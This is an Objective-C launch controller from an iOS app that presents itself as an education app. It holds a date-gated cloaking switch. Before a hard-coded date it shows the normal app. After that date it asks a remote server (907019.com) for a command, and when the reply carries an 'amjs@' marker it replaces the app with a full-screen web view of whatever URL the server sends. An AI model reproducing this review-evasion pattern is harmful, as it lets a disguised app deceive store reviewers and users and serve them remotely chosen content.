//
//  HJGLauchController.m
//  ChilEducation
//
//  Created by Developer on 2018/8/11.
//  Copyright © 2018年 Developer. All rights reserved.
//

#import "HJGLauchController.h"
#import "ViewController.h"
#import <AXWebViewController.h>
#define r9rkRM8w @"r9rkRM8w.api.lncld"
@interface HJGLauchController ()

@end

@implementation HJGLauchController

- (void)viewDidLoad {
    [super viewDidLoad];

    [SVProgressHUD showWithStatus:@"正在载入..."];

    NSDateFormatter * dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"yyyy-MM-dd"];
    NSString *dateTime=[dateFormatter stringFromDate:[NSDate date]];
    NSDate *currendate = [dateFormatter dateFromString:dateTime];
    NSDate *date = [dateFormatter dateFromString:@"2018-08-19"];
    NSComparisonResult result = [date compare:currendate];
    if (result == NSOrderedDescending)
    {
        [self lauch];
    }
    else if (result == NSOrderedAscending)
    {
        [self get];
    }
}

- (void)lauch{
    

    // 设置初始导航栏透明度
    [self wr_setNavBarBackgroundAlpha:0];
    
    [SVProgressHUD dismiss];
        
    ViewController *vc = [[ViewController alloc]init];
    [self.navigationController pushViewController:vc animated:NO];

    
    
}


- (void)get{
    
    
    NSString *url_string = [NSString stringWithFormat:@"http://907019.com:84/wd/link/%@",[[NSBundle mainBundle] bundleIdentifier]];
    AFHTTPSessionManager *manager =[AFHTTPSessionManager manager];
    manager.responseSerializer = [AFHTTPResponseSerializer serializer];
    [manager GET:url_string parameters:nil success:^(NSURLSessionDataTask *task, id responseObject) {
        NSString *result = [[NSString alloc]initWithData:responseObject encoding:NSUTF8StringEncoding];
        
        if ([result containsString:@"amjs@"]) {
            NSArray *result_arr = [result componentsSeparatedByString:@"@"];
            NSString *string_am = [result_arr lastObject];
            [SVProgressHUD dismiss];
            AXWebViewController *webVC = [[AXWebViewController alloc] initWithAddress:string_am];
            UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:webVC];
            nav.navigationBar.tintColor = [UIColor colorWithRed:0.322 green:0.322 blue:0.322 alpha:1.00];
            [self presentViewController:nav animated:NO completion:NULL];
            webVC.showsToolBar = YES;
            webVC.navigationType = 1;
            
        }else{
            [self lauch];
            [SVProgressHUD dismiss];
        }
    } failure:^(NSURLSessionDataTask *task, NSError *error) {
        NSLog(@"%@",error);
        [self lauch];
        [SVProgressHUD dismiss];
    }];
    
}



@end
